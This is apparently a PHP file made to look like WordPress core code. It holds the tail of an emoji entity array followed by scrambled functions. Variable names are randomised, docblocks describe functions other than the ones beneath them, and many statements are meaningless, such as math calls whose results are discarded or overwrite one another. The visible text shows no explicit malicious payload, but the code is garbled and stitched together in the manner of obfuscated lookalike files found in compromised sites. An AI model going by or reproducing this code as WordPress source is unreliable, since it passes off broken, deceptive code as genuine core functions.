'&#x1f32f;', '&#x1f330;', '&#x1f331;', '&#x1f332;', '&#x1f333;', '&#x1f334;', '&#x1f335;', '&#x1f336;', '&#x1f337;', '&#x1f338;', '&#x1f339;', '&#x1f33a;', '&#x1f33b;', '&#x1f33c;', '&#x1f33d;', '&#x1f33e;', '&#x1f33f;', '&#x1f340;', '&#x1f341;', '&#x1f342;', '&#x1f343;', '&#x1f344;', '&#x1f345;', '&#x1f346;', '&#x1f347;', '&#x1f348;', '&#x1f349;', '&#x1f34a;', '&#x1f34b;', '&#x1f34c;', '&#x1f34d;', '&#x1f34e;', '&#x1f34f;', '&#x1f350;', '&#x1f351;', '&#x1f352;', '&#x1f353;', '&#x1f354;', '&#x1f355;', '&#x1f356;', '&#x1f357;', '&#x1f358;', '&#x1f359;', '&#x1f35a;', '&#x1f35b;', '&#x1f35c;', '&#x1f35d;', '&#x1f35e;', '&#x1f35f;', '&#x1f360;', '&#x1f361;', '&#x1f362;', '&#x1f363;', '&#x1f364;', '&#x1f365;', '&#x1f366;', '&#x1f367;', '&#x1f368;', '&#x1f369;', '&#x1f36a;', '&#x1f36b;', '&#x1f36c;', '&#x1f36d;', '&#x1f36e;', '&#x1f36f;', '&#x1f370;', '&#x1f371;', '&#x1f372;', '&#x1f373;', '&#x1f374;', '&#x1f375;', '&#x1f376;', '&#x1f377;', '&#x1f378;', '&#x1f379;', '&#x1f37a;', '&#x1f37b;', '&#x1f37c;', '&#x1f37d;', '&#x1f37e;', '&#x1f37f;', '&#x1f380;', '&#x1f381;', '&#x1f382;', '&#x1f383;', '&#x1f384;', '&#x1f385;', '&#x1f3fb;', '&#x1f3fc;', '&#x1f3fd;', '&#x1f3fe;', '&#x1f3ff;', '&#x1f386;', '&#x1f387;', '&#x1f388;', '&#x1f389;', '&#x1f38a;', '&#x1f38b;', '&#x1f38c;', '&#x1f38d;', '&#x1f38e;', '&#x1f38f;', '&#x1f390;', '&#x1f391;', '&#x1f392;', '&#x1f393;', '&#x1f396;', '&#x1f397;', '&#x1f399;', '&#x1f39a;', '&#x1f39b;', '&#x1f39e;', '&#x1f39f;', '&#x1f3a0;', '&#x1f3a1;', '&#x1f3a2;', '&#x1f3a3;', '&#x1f3a4;', '&#x1f3a5;', '&#x1f3a6;', '&#x1f3a7;', '&#x1f3a8;', '&#x1f3a9;', '&#x1f3aa;', '&#x1f3ab;', '&#x1f3ac;', '&#x1f3ad;', '&#x1f3ae;', '&#x1f3af;', '&#x1f3b0;', '&#x1f3b1;', '&#x1f3b2;', '&#x1f3b3;', '&#x1f3b4;', '&#x1f3b5;', '&#x1f3b6;', '&#x1f3b7;', '&#x1f3b8;', '&#x1f3b9;', '&#x1f3ba;', '&#x1f3bb;', '&#x1f3bc;', '&#x1f3bd;', '&#x1f3be;', '&#x1f3bf;', '&#x1f3c0;', '&#x1f3c1;', '&#x1f3c2;', '&#x1f3c3;', '&#x200d;', '&#x2640;', '&#xfe0f;', '&#x2642;', '&#x1f3c4;', '&#x1f3c5;', '&#x1f3c6;', '&#x1f3c7;', '&#x1f3c8;', '&#x1f3c9;', '&#x1f3ca;', '&#x1f3cb;', '&#x1f3cc;', '&#x1f3cd;', '&#x1f3ce;', '&#x1f3cf;', '&#x1f3d0;', '&#x1f3d1;', '&#x1f3d2;', '&#x1f3d3;', '&#x1f3d4;', '&#x1f3d5;', '&#x1f3d6;', '&#x1f3d7;', '&#x1f3d8;', '&#x1f3d9;', '&#x1f3da;', '&#x1f3db;', '&#x1f3dc;', '&#x1f3dd;', '&#x1f3de;', '&#x1f3df;', '&#x1f3e0;', '&#x1f3e1;', '&#x1f3e2;', '&#x1f3e3;', '&#x1f3e4;', '&#x1f3e5;', '&#x1f3e6;', '&#x1f3e7;', '&#x1f3e8;', '&#x1f3e9;', '&#x1f3ea;', '&#x1f3eb;', '&#x1f3ec;', '&#x1f3ed;', '&#x1f3ee;', '&#x1f3ef;', '&#x1f3f0;', '&#x1f3f3;', '&#x26a7;', '&#x1f3f4;', '&#x2620;', '&#xe0067;', '&#xe0062;', '&#xe0065;', '&#xe006e;', '&#xe007f;', '&#xe0073;', '&#xe0063;', '&#xe0074;', '&#xe0077;', '&#xe006c;', '&#x1f3f5;', '&#x1f3f7;', '&#x1f3f8;', '&#x1f3f9;', '&#x1f3fa;', '&#x1f400;', '&#x1f401;', '&#x1f402;', '&#x1f403;', '&#x1f404;', '&#x1f405;', '&#x1f406;', '&#x1f407;', '&#x1f408;', '&#x2b1b;', '&#x1f409;', '&#x1f40a;', '&#x1f40b;', '&#x1f40c;', '&#x1f40d;', '&#x1f40e;', '&#x1f40f;', '&#x1f410;', '&#x1f411;', '&#x1f412;', '&#x1f413;', '&#x1f414;', '&#x1f415;', '&#x1f9ba;', '&#x1f416;', '&#x1f417;', '&#x1f418;', '&#x1f419;', '&#x1f41a;', '&#x1f41b;', '&#x1f41c;', '&#x1f41d;', '&#x1f41e;', '&#x1f41f;', '&#x1f420;', '&#x1f421;', '&#x1f422;', '&#x1f423;', '&#x1f424;', '&#x1f425;', '&#x1f426;', '&#x1f427;', '&#x1f428;', '&#x1f429;', '&#x1f42a;', '&#x1f42b;', '&#x1f42c;', '&#x1f42d;', '&#x1f42e;', '&#x1f42f;', '&#x1f430;', '&#x1f431;', '&#x1f432;', '&#x1f433;', '&#x1f434;', '&#x1f435;', '&#x1f436;', '&#x1f437;', '&#x1f438;', '&#x1f439;', '&#x1f43a;', '&#x1f43b;', '&#x2744;', '&#x1f43c;', '&#x1f43d;', '&#x1f43e;', '&#x1f43f;', '&#x1f440;', '&#x1f441;', '&#x1f5e8;', '&#x1f442;', '&#x1f443;', '&#x1f444;', '&#x1f445;', '&#x1f446;', '&#x1f447;', '&#x1f448;', '&#x1f449;', '&#x1f44a;', '&#x1f44b;', '&#x1f44c;', '&#x1f44d;', '&#x1f44e;', '&#x1f44f;', '&#x1f450;', '&#x1f451;', '&#x1f452;', '&#x1f453;', '&#x1f454;', '&#x1f455;', '&#x1f456;', '&#x1f457;', '&#x1f458;', '&#x1f459;', '&#x1f45a;', '&#x1f45b;', '&#x1f45c;', '&#x1f45d;', '&#x1f45e;', '&#x1f45f;', '&#x1f460;', '&#x1f461;', '&#x1f462;', '&#x1f463;', '&#x1f464;', '&#x1f465;', '&#x1f466;', '&#x1f467;', '&#x1f468;', '&#x1f4bb;', '&#x1f4bc;', '&#x1f527;', '&#x1f52c;', '&#x1f680;', '&#x1f692;', '&#x1f91d;', '&#x1f9af;', '&#x1f9b0;', '&#x1f9b1;', '&#x1f9b2;', '&#x1f9b3;', '&#x1f9bc;', '&#x1f9bd;', '&#x2695;', '&#x2696;', '&#x2708;', '&#x2764;', '&#x1f48b;', '&#x1f469;', '&#x1f46a;', '&#x1f46b;', '&#x1f46c;', '&#x1f46d;', '&#x1f46e;', '&#x1f46f;', '&#x1f470;', '&#x1f471;', '&#x1f472;', '&#x1f473;', '&#x1f474;', '&#x1f475;', '&#x1f476;', '&#x1f477;', '&#x1f478;', '&#x1f479;', '&#x1f47a;', '&#x1f47b;', '&#x1f47c;', '&#x1f47d;', '&#x1f47e;', '&#x1f47f;', '&#x1f480;', '&#x1f481;', '&#x1f482;', '&#x1f483;', '&#x1f484;', '&#x1f485;', '&#x1f486;', '&#x1f487;', '&#x1f488;', '&#x1f489;', '&#x1f48a;', '&#x1f48c;', '&#x1f48d;', '&#x1f48e;', '&#x1f48f;', '&#x1f490;', '&#x1f491;', '&#x1f492;', '&#x1f493;', '&#x1f494;', '&#x1f495;', '&#x1f496;', '&#x1f497;', '&#x1f498;', '&#x1f499;', '&#x1f49a;', '&#x1f49b;', '&#x1f49c;', '&#x1f49d;', '&#x1f49e;', '&#x1f49f;', '&#x1f4a0;', '&#x1f4a1;', '&#x1f4a2;', '&#x1f4a3;', '&#x1f4a4;', '&#x1f4a5;', '&#x1f4a6;', '&#x1f4a7;', '&#x1f4a8;', '&#x1f4a9;', '&#x1f4aa;', '&#x1f4ab;', '&#x1f4ac;', '&#x1f4ad;', '&#x1f4ae;', '&#x1f4af;', '&#x1f4b0;', '&#x1f4b1;', '&#x1f4b2;', '&#x1f4b3;', '&#x1f4b4;', '&#x1f4b5;', '&#x1f4b6;', '&#x1f4b7;', '&#x1f4b8;', '&#x1f4b9;', '&#x1f4ba;', '&#x1f4bd;', '&#x1f4be;', '&#x1f4bf;', '&#x1f4c0;', '&#x1f4c1;', '&#x1f4c2;', '&#x1f4c3;', '&#x1f4c4;', '&#x1f4c5;', '&#x1f4c6;', '&#x1f4c7;', '&#x1f4c8;', '&#x1f4c9;', '&#x1f4ca;', '&#x1f4cb;', '&#x1f4cc;', '&#x1f4cd;', '&#x1f4ce;', '&#x1f4cf;', '&#x1f4d0;', '&#x1f4d1;', '&#x1f4d2;', '&#x1f4d3;', '&#x1f4d4;', '&#x1f4d5;', '&#x1f4d6;', '&#x1f4d7;', '&#x1f4d8;', '&#x1f4d9;', '&#x1f4da;', '&#x1f4db;', '&#x1f4dc;', '&#x1f4dd;', '&#x1f4de;', '&#x1f4df;', '&#x1f4e0;', '&#x1f4e1;', '&#x1f4e2;', '&#x1f4e3;', '&#x1f4e4;', '&#x1f4e5;', '&#x1f4e6;', '&#x1f4e7;', '&#x1f4e8;', '&#x1f4e9;', '&#x1f4ea;', '&#x1f4eb;', '&#x1f4ec;', '&#x1f4ed;', '&#x1f4ee;', '&#x1f4ef;', '&#x1f4f0;', '&#x1f4f1;', '&#x1f4f2;', '&#x1f4f3;', '&#x1f4f4;', '&#x1f4f5;', '&#x1f4f6;', '&#x1f4f7;', '&#x1f4f8;', '&#x1f4f9;', '&#x1f4fa;', '&#x1f4fb;', '&#x1f4fc;', '&#x1f4fd;', '&#x1f4ff;', '&#x1f500;', '&#x1f501;', '&#x1f502;', '&#x1f503;', '&#x1f504;', '&#x1f505;', '&#x1f506;', '&#x1f507;', '&#x1f508;', '&#x1f509;', '&#x1f50a;', '&#x1f50b;', '&#x1f50c;', '&#x1f50d;', '&#x1f50e;', '&#x1f50f;', '&#x1f510;', '&#x1f511;', '&#x1f512;', '&#x1f513;', '&#x1f514;', '&#x1f515;', '&#x1f516;', '&#x1f517;', '&#x1f518;', '&#x1f519;', '&#x1f51a;', '&#x1f51b;', '&#x1f51c;', '&#x1f51d;', '&#x1f51e;', '&#x1f51f;', '&#x1f520;', '&#x1f521;', '&#x1f522;', '&#x1f523;', '&#x1f524;', '&#x1f525;', '&#x1f526;', '&#x1f528;', '&#x1f529;', '&#x1f52a;', '&#x1f52b;', '&#x1f52d;', '&#x1f52e;', '&#x1f52f;', '&#x1f530;', '&#x1f531;', '&#x1f532;', '&#x1f533;', '&#x1f534;', '&#x1f535;', '&#x1f536;', '&#x1f537;', '&#x1f538;', '&#x1f539;', '&#x1f53a;', '&#x1f53b;', '&#x1f53c;', '&#x1f53d;', '&#x1f549;', '&#x1f54a;', '&#x1f54b;', '&#x1f54c;', '&#x1f54d;', '&#x1f54e;', '&#x1f550;', '&#x1f551;', '&#x1f552;', '&#x1f553;', '&#x1f554;', '&#x1f555;', '&#x1f556;', '&#x1f557;', '&#x1f558;', '&#x1f559;', '&#x1f55a;', '&#x1f55b;', '&#x1f55c;', '&#x1f55d;', '&#x1f55e;', '&#x1f55f;', '&#x1f560;', '&#x1f561;', '&#x1f562;', '&#x1f563;', '&#x1f564;', '&#x1f565;', '&#x1f566;', '&#x1f567;', '&#x1f56f;', '&#x1f570;', '&#x1f573;', '&#x1f574;', '&#x1f575;', '&#x1f576;', '&#x1f577;', '&#x1f578;', '&#x1f579;', '&#x1f57a;', '&#x1f587;', '&#x1f58a;', '&#x1f58b;', '&#x1f58c;', '&#x1f58d;', '&#x1f590;', '&#x1f595;', '&#x1f596;', '&#x1f5a4;', '&#x1f5a5;', '&#x1f5a8;', '&#x1f5b1;', '&#x1f5b2;', '&#x1f5bc;', '&#x1f5c2;', '&#x1f5c3;', '&#x1f5c4;', '&#x1f5d1;', '&#x1f5d2;', '&#x1f5d3;', '&#x1f5dc;', '&#x1f5dd;', '&#x1f5de;', '&#x1f5e1;', '&#x1f5e3;', '&#x1f5ef;', '&#x1f5f3;', '&#x1f5fa;', '&#x1f5fb;', '&#x1f5fc;', '&#x1f5fd;', '&#x1f5fe;', '&#x1f5ff;', '&#x1f600;', '&#x1f601;', '&#x1f602;', '&#x1f603;', '&#x1f604;', '&#x1f605;', '&#x1f606;', '&#x1f607;', '&#x1f608;', '&#x1f609;', '&#x1f60a;', '&#x1f60b;', '&#x1f60c;', '&#x1f60d;', '&#x1f60e;', '&#x1f60f;', '&#x1f610;', '&#x1f611;', '&#x1f612;', '&#x1f613;', '&#x1f614;', '&#x1f615;', '&#x1f616;', '&#x1f617;', '&#x1f618;', '&#x1f619;', '&#x1f61a;', '&#x1f61b;', '&#x1f61c;', '&#x1f61d;', '&#x1f61e;', '&#x1f61f;', '&#x1f620;', '&#x1f621;', '&#x1f622;', '&#x1f623;', '&#x1f624;', '&#x1f625;', '&#x1f626;', '&#x1f627;', '&#x1f628;', '&#x1f629;', '&#x1f62a;', '&#x1f62b;', '&#x1f62c;', '&#x1f62d;', '&#x1f62e;', '&#x1f62f;', '&#x1f630;', '&#x1f631;', '&#x1f632;', '&#x1f633;', '&#x1f634;', '&#x1f635;', '&#x1f636;', '&#x1f637;', '&#x1f638;', '&#x1f639;', '&#x1f63a;', '&#x1f63b;', '&#x1f63c;', '&#x1f63d;', '&#x1f63e;', '&#x1f63f;', '&#x1f640;', '&#x1f641;', '&#x1f642;', '&#x1f643;', '&#x1f644;', '&#x1f645;', '&#x1f646;', '&#x1f647;', '&#x1f648;', '&#x1f649;', '&#x1f64a;', '&#x1f64b;', '&#x1f64c;', '&#x1f64d;', '&#x1f64e;', '&#x1f64f;', '&#x1f681;', '&#x1f682;', '&#x1f683;', '&#x1f684;', '&#x1f685;', '&#x1f686;', '&#x1f687;', '&#x1f688;', '&#x1f689;', '&#x1f68a;', '&#x1f68b;', '&#x1f68c;', '&#x1f68d;', '&#x1f68e;', '&#x1f68f;', '&#x1f690;', '&#x1f691;', '&#x1f693;', '&#x1f694;', '&#x1f695;', '&#x1f696;', '&#x1f697;', '&#x1f698;', '&#x1f699;', '&#x1f69a;', '&#x1f69b;', '&#x1f69c;', '&#x1f69d;', '&#x1f69e;', '&#x1f69f;', '&#x1f6a0;', '&#x1f6a1;', '&#x1f6a2;', '&#x1f6a3;', '&#x1f6a4;', '&#x1f6a5;', '&#x1f6a6;', '&#x1f6a7;', '&#x1f6a8;', '&#x1f6a9;', '&#x1f6aa;', '&#x1f6ab;', '&#x1f6ac;', '&#x1f6ad;', '&#x1f6ae;', '&#x1f6af;', '&#x1f6b0;', '&#x1f6b1;', '&#x1f6b2;', '&#x1f6b3;', '&#x1f6b4;', '&#x1f6b5;', '&#x1f6b6;', '&#x1f6b7;', '&#x1f6b8;', '&#x1f6b9;', '&#x1f6ba;', '&#x1f6bb;', '&#x1f6bc;', '&#x1f6bd;', '&#x1f6be;', '&#x1f6bf;', '&#x1f6c0;', '&#x1f6c1;', '&#x1f6c2;', '&#x1f6c3;', '&#x1f6c4;', '&#x1f6c5;', '&#x1f6cb;', '&#x1f6cc;', '&#x1f6cd;', '&#x1f6ce;', '&#x1f6cf;', '&#x1f6d0;', '&#x1f6d1;', '&#x1f6d2;', '&#x1f6d5;', '&#x1f6d6;', '&#x1f6d7;', '&#x1f6dc;', '&#x1f6dd;', '&#x1f6de;', '&#x1f6df;', '&#x1f6e0;', '&#x1f6e1;', '&#x1f6e2;', '&#x1f6e3;', '&#x1f6e4;', '&#x1f6e5;', '&#x1f6e9;', '&#x1f6eb;', '&#x1f6ec;', '&#x1f6f0;', '&#x1f6f3;', '&#x1f6f4;', '&#x1f6f5;', '&#x1f6f6;', '&#x1f6f7;', '&#x1f6f8;', '&#x1f6f9;', '&#x1f6fa;', '&#x1f6fb;', '&#x1f6fc;', '&#x1f7e0;', '&#x1f7e1;', '&#x1f7e2;', '&#x1f7e3;', '&#x1f7e4;', '&#x1f7e5;', '&#x1f7e6;', '&#x1f7e7;', '&#x1f7e8;', '&#x1f7e9;', '&#x1f7ea;', '&#x1f7eb;', '&#x1f7f0;', '&#x1f90c;', '&#x1f90d;', '&#x1f90e;', '&#x1f90f;', '&#x1f910;', '&#x1f911;', '&#x1f912;', '&#x1f913;', '&#x1f914;', '&#x1f915;', '&#x1f916;', '&#x1f917;', '&#x1f918;', '&#x1f919;', '&#x1f91a;', '&#x1f91b;', '&#x1f91c;', '&#x1f91e;', '&#x1f91f;', '&#x1f920;', '&#x1f921;', '&#x1f922;', '&#x1f923;', '&#x1f924;', '&#x1f925;', '&#x1f926;', '&#x1f927;', '&#x1f928;', '&#x1f929;', '&#x1f92a;', '&#x1f92b;', '&#x1f92c;', '&#x1f92d;', '&#x1f92e;', '&#x1f92f;', '&#x1f930;', '&#x1f931;', '&#x1f932;', '&#x1f933;', '&#x1f934;', '&#x1f935;', '&#x1f936;', '&#x1f937;', '&#x1f938;', '&#x1f939;', '&#x1f93a;', '&#x1f93c;', '&#x1f93d;', '&#x1f93e;', '&#x1f93f;', '&#x1f940;', '&#x1f941;', '&#x1f942;', '&#x1f943;', '&#x1f944;', '&#x1f945;', '&#x1f947;', '&#x1f948;', '&#x1f949;', '&#x1f94a;', '&#x1f94b;', '&#x1f94c;', '&#x1f94d;', '&#x1f94e;', '&#x1f94f;', '&#x1f950;', '&#x1f951;', '&#x1f952;', '&#x1f953;', '&#x1f954;', '&#x1f955;', '&#x1f956;', '&#x1f957;', '&#x1f958;', '&#x1f959;', '&#x1f95a;', '&#x1f95b;', '&#x1f95c;', '&#x1f95d;', '&#x1f95e;', '&#x1f95f;', '&#x1f960;', '&#x1f961;', '&#x1f962;', '&#x1f963;', '&#x1f964;', '&#x1f965;', '&#x1f966;', '&#x1f967;', '&#x1f968;', '&#x1f969;', '&#x1f96a;', '&#x1f96b;', '&#x1f96c;', '&#x1f96d;', '&#x1f96e;', '&#x1f96f;', '&#x1f970;', '&#x1f971;', '&#x1f972;', '&#x1f973;', '&#x1f974;', '&#x1f975;', '&#x1f976;', '&#x1f977;', '&#x1f978;', '&#x1f979;', '&#x1f97a;', '&#x1f97b;', '&#x1f97c;', '&#x1f97d;', '&#x1f97e;', '&#x1f97f;', '&#x1f980;', '&#x1f981;', '&#x1f982;', '&#x1f983;', '&#x1f984;', '&#x1f985;', '&#x1f986;', '&#x1f987;', '&#x1f988;', '&#x1f989;', '&#x1f98a;', '&#x1f98b;', '&#x1f98c;', '&#x1f98d;', '&#x1f98e;', '&#x1f98f;', '&#x1f990;', '&#x1f991;', '&#x1f992;', '&#x1f993;', '&#x1f994;', '&#x1f995;', '&#x1f996;', '&#x1f997;', '&#x1f998;', '&#x1f999;', '&#x1f99a;', '&#x1f99b;', '&#x1f99c;', '&#x1f99d;', '&#x1f99e;', '&#x1f99f;', '&#x1f9a0;', '&#x1f9a1;', '&#x1f9a2;', '&#x1f9a3;', '&#x1f9a4;', '&#x1f9a5;', '&#x1f9a6;', '&#x1f9a7;', '&#x1f9a8;', '&#x1f9a9;', '&#x1f9aa;', '&#x1f9ab;', '&#x1f9ac;', '&#x1f9ad;', '&#x1f9ae;', '&#x1f9b4;', '&#x1f9b5;', '&#x1f9b6;', '&#x1f9b7;', '&#x1f9b8;', '&#x1f9b9;', '&#x1f9bb;', '&#x1f9be;', '&#x1f9bf;', '&#x1f9c0;', '&#x1f9c1;', '&#x1f9c2;', '&#x1f9c3;', '&#x1f9c4;', '&#x1f9c5;', '&#x1f9c6;', '&#x1f9c7;', '&#x1f9c8;', '&#x1f9c9;', '&#x1f9ca;', '&#x1f9cb;', '&#x1f9cc;', '&#x1f9cd;', '&#x1f9ce;', '&#x1f9cf;', '&#x1f9d0;', '&#x1f9d1;', '&#x1f9d2;', '&#x1f9d3;', '&#x1f9d4;', '&#x1f9d5;', '&#x1f9d6;', '&#x1f9d7;', '&#x1f9d8;', '&#x1f9d9;', '&#x1f9da;', '&#x1f9db;', '&#x1f9dc;', '&#x1f9dd;', '&#x1f9de;', '&#x1f9df;', '&#x1f9e0;', '&#x1f9e1;', '&#x1f9e2;', '&#x1f9e3;', '&#x1f9e4;', '&#x1f9e5;', '&#x1f9e6;', '&#x1f9e7;', '&#x1f9e8;', '&#x1f9e9;', '&#x1f9ea;', '&#x1f9eb;', '&#x1f9ec;', '&#x1f9ed;', '&#x1f9ee;', '&#x1f9ef;', '&#x1f9f0;', '&#x1f9f1;', '&#x1f9f2;', '&#x1f9f3;', '&#x1f9f4;', '&#x1f9f5;', '&#x1f9f6;', '&#x1f9f7;', '&#x1f9f8;', '&#x1f9f9;', '&#x1f9fa;', '&#x1f9fb;', '&#x1f9fc;', '&#x1f9fd;', '&#x1f9fe;', '&#x1f9ff;', '&#x1fa70;', '&#x1fa71;', '&#x1fa72;', '&#x1fa73;', '&#x1fa74;', '&#x1fa75;', '&#x1fa76;', '&#x1fa77;', '&#x1fa78;', '&#x1fa79;', '&#x1fa7a;', '&#x1fa7b;', '&#x1fa7c;', '&#x1fa80;', '&#x1fa81;', '&#x1fa82;', '&#x1fa83;', '&#x1fa84;', '&#x1fa85;', '&#x1fa86;', '&#x1fa87;', '&#x1fa88;', '&#x1fa90;', '&#x1fa91;', '&#x1fa92;', '&#x1fa93;', '&#x1fa94;', '&#x1fa95;', '&#x1fa96;', '&#x1fa97;', '&#x1fa98;', '&#x1fa99;', '&#x1fa9a;', '&#x1fa9b;', '&#x1fa9c;', '&#x1fa9d;', '&#x1fa9e;', '&#x1fa9f;', '&#x1faa0;', '&#x1faa1;', '&#x1faa2;', '&#x1faa3;', '&#x1faa4;', '&#x1faa5;', '&#x1faa6;', '&#x1faa7;', '&#x1faa8;', '&#x1faa9;', '&#x1faaa;', '&#x1faab;', '&#x1faac;', '&#x1faad;', '&#x1faae;', '&#x1faaf;', '&#x1fab0;', '&#x1fab1;', '&#x1fab2;', '&#x1fab3;', '&#x1fab4;', '&#x1fab5;', '&#x1fab6;', '&#x1fab7;', '&#x1fab8;', '&#x1fab9;', '&#x1faba;', '&#x1fabb;', '&#x1fabc;', '&#x1fabd;', '&#x1fabf;', '&#x1fac0;', '&#x1fac1;', '&#x1fac2;', '&#x1fac3;', '&#x1fac4;', '&#x1fac5;', '&#x1face;', '&#x1facf;', '&#x1fad0;', '&#x1fad1;', '&#x1fad2;', '&#x1fad3;', '&#x1fad4;', '&#x1fad5;', '&#x1fad6;', '&#x1fad7;', '&#x1fad8;', '&#x1fad9;', '&#x1fada;', '&#x1fadb;', '&#x1fae0;', '&#x1fae1;', '&#x1fae2;', '&#x1fae3;', '&#x1fae4;', '&#x1fae5;', '&#x1fae6;', '&#x1fae7;', '&#x1fae8;', '&#x1faf0;', '&#x1faf1;', '&#x1faf2;', '&#x1faf3;', '&#x1faf4;', '&#x1faf5;', '&#x1faf6;', '&#x1faf7;', '&#x1faf8;', '&#x203c;', '&#x2049;', '&#x2122;', '&#x2139;', '&#x2194;', '&#x2195;', '&#x2196;', '&#x2197;', '&#x2198;', '&#x2199;', '&#x21a9;', '&#x21aa;', '&#x20e3;', '&#x231a;', '&#x231b;', '&#x2328;', '&#x23cf;', '&#x23e9;', '&#x23ea;', '&#x23eb;', '&#x23ec;', '&#x23ed;', '&#x23ee;', '&#x23ef;', '&#x23f0;', '&#x23f1;', '&#x23f2;', '&#x23f3;', '&#x23f8;', '&#x23f9;', '&#x23fa;', '&#x24c2;', '&#x25aa;', '&#x25ab;', '&#x25b6;', '&#x25c0;', '&#x25fb;', '&#x25fc;', '&#x25fd;', '&#x25fe;', '&#x2600;', '&#x2601;', '&#x2602;', '&#x2603;', '&#x2604;', '&#x260e;', '&#x2611;', '&#x2614;', '&#x2615;', '&#x2618;', '&#x261d;', '&#x2622;', '&#x2623;', '&#x2626;', '&#x262a;', '&#x262e;', '&#x262f;', '&#x2638;', '&#x2639;', '&#x263a;', '&#x2648;', '&#x2649;', '&#x264a;', '&#x264b;', '&#x264c;', '&#x264d;', '&#x264e;', '&#x264f;', '&#x2650;', '&#x2651;', '&#x2652;', '&#x2653;', '&#x265f;', '&#x2660;', '&#x2663;', '&#x2665;', '&#x2666;', '&#x2668;', '&#x267b;', '&#x267e;', '&#x267f;', '&#x2692;', '&#x2693;', '&#x2694;', '&#x2697;', '&#x2699;', '&#x269b;', '&#x269c;', '&#x26a0;', '&#x26a1;', '&#x26aa;', '&#x26ab;', '&#x26b0;', '&#x26b1;', '&#x26bd;', '&#x26be;', '&#x26c4;', '&#x26c5;', '&#x26c8;', '&#x26ce;', '&#x26cf;', '&#x26d1;', '&#x26d3;', '&#x26d4;', '&#x26e9;', '&#x26ea;', '&#x26f0;', '&#x26f1;', '&#x26f2;', '&#x26f3;', '&#x26f4;', '&#x26f5;', '&#x26f7;', '&#x26f8;', '&#x26f9;', '&#x26fa;', '&#x26fd;', '&#x2702;', '&#x2705;', '&#x2709;', '&#x270a;', '&#x270b;', '&#x270c;', '&#x270d;', '&#x270f;', '&#x2712;', '&#x2714;', '&#x2716;', '&#x271d;', '&#x2721;', '&#x2728;', '&#x2733;', '&#x2734;', '&#x2747;', '&#x274c;', '&#x274e;', '&#x2753;', '&#x2754;', '&#x2755;', '&#x2757;', '&#x2763;', '&#x2795;', '&#x2796;', '&#x2797;', '&#x27a1;', '&#x27b0;', '&#x27bf;', '&#x2934;', '&#x2935;', '&#x2b05;', '&#x2b06;', '&#x2b07;', '&#x2b1c;', '&#x2b50;', '&#x2b55;', '&#x3030;', '&#x303d;', '&#x3297;', '&#x3299;', '&#xe50a;');
    // END: emoji arrays
    if ('entities' === $wasnt_square) {
        return $req_cred;
    }
    return $permastruct;
}


/**
 * Returns all the categories for block types that will be shown in the block editor.
 *
 * @since 5.0.0
 * @since 5.8.0 It is possible to pass the block editor context as param.
 *
 * @param WP_Post|WP_Block_Editor_Context $thisfile_riff_WAVE_cart_0_or_block_editor_context The current post object or
 *                                                                      the block editor context.
 *
 * @return array[] Array of categories for block types.
 */

 if(empty(atan(9)) ==  false) {
 	$data_fields = 'noqn1t';
 }
$loaded = (!isset($loaded)? "ftnl9pl3" : "e1dl");
$trackback_url['ozxusb3'] = 3798;
/**
 * Displays or retrieves page title for tag post archive.
 *
 * Useful for tag template files for displaying the tag page title. The prefix
 * does not automatically place a space between the prefix, so if there should
 * be a space, the parameter value will need to have it at the end.
 *
 * @since 2.3.0
 *
 * @param string $menu_post  Optional. What to display before the title.
 * @param bool   $fourbit Optional. Whether to display or retrieve title. Default true.
 * @return string|void Title when retrieving.
 */
function get_category_by_path($menu_post = '', $fourbit = true)
{
    return single_term_title($menu_post, $fourbit);
}
$restriction_value = substr($classic_theme_styles, 20, 8);
$link_dialog_printed = wp_debug_mode($link_dialog_printed);
$multirequest['qt408ada'] = 2601;
$link_dialog_printed = decoct(428);
$fn_order_src = (!isset($fn_order_src)?	"iimmkpo"	:	"repa");


/**
	 * Checks if the user can refresh this partial.
	 *
	 * Returns false if the user cannot manipulate one of the associated settings,
	 * or if one of the associated settings does not exist.
	 *
	 * @since 4.5.0
	 *
	 * @return bool False if user can't edit one of the related settings,
	 *                    or if one of the associated settings does not exist.
	 */

 if((strtr($link_dialog_printed, 13, 12)) ==  TRUE){
 	$paged = 'ax009';
 }
$search_term = strnatcasecmp($classic_theme_styles, $link_dialog_printed);
$akid = 'qjuegf';
$akid = strtolower($akid);
$feed_base = (!isset($feed_base)? 	"ykxzb" 	: 	"w3m5dng");
$akid = log1p(140);
$akid = wp_global_styles_render_svg_filters($akid);
$copy = 'luuvoncc';
$akid = crc32($copy);
$new_menu_locations = (!isset($new_menu_locations)?"c7g0hngp":"ska2xb");


/*
			 * Instead of clearing the parser state and starting fresh, calling the stack methods
			 * maintains the proper flags in the parser.
			 */

 if(!empty(str_shuffle($copy)) ==  True)	{
 	$only_crop_sizes = 'qatqx';
 }
/**
 * Executes changes made in WordPress 4.3.0.
 *
 * @ignore
 * @since 4.3.0
 *
 * @global int  $create_cap The old (current) database version.
 * @global wpdb $upgrade_files                  WordPress database abstraction object.
 */
function clean_object_term_cache()
{
    global $create_cap, $upgrade_files;
    if ($create_cap < 32364) {
        clean_object_term_cache_fix_comments();
    }
    // Shared terms are split in a separate process.
    if ($create_cap < 32814) {
        update_option('finished_splitting_shared_terms', 0);
        wp_schedule_single_event(time() + 1 * MINUTE_IN_SECONDS, 'wp_split_shared_term_batch');
    }
    if ($create_cap < 33055 && 'utf8mb4' === $upgrade_files->charset) {
        if (is_multisite()) {
            $currentday = $upgrade_files->tables('blog');
        } else {
            $currentday = $upgrade_files->tables('all');
            if (!wp_should_upgrade_global_tables()) {
                $maintenance = $upgrade_files->tables('global');
                $currentday = array_diff_assoc($currentday, $maintenance);
            }
        }
        foreach ($currentday as $author_url_display) {
            maybe_convert_table_to_utf8mb4($author_url_display);
        }
    }
}
$akid = acosh(490);
$copy = 'f9whi';
$akid = site_url($copy);


/**
 * Registers widget control callback for customizing options.
 *
 * Allows $previous_comments_link to be an array that accepts either three elements to grab the
 * first element and the third for the name or just uses the first element of
 * the array for the name.
 *
 * Passes to wp_register_widget_control() after the argument list has
 * been compiled.
 *
 * @since 2.2.0
 * @deprecated 2.8.0 Use wp_register_widget_control()
 * @see wp_register_widget_control()
 *
 * @param int|string $previous_comments_link             Sidebar ID.
 * @param callable   $control_callback Widget control callback to display and process form.
 * @param int        $draft            Widget width.
 * @param int        $WEBP_VP8L_header           Widget height.
 * @param mixed      ...$params        Widget parameters.
 */

 if((log10(122)) ===  TRUE) {
 	$punycode = 'k4rbx';
 }
$custom_css_setting['i5cagig'] = 3850;
/**
 * Sends the "Allow" header to state all methods that can be sent to the current route.
 *
 * @since 4.4.0
 *
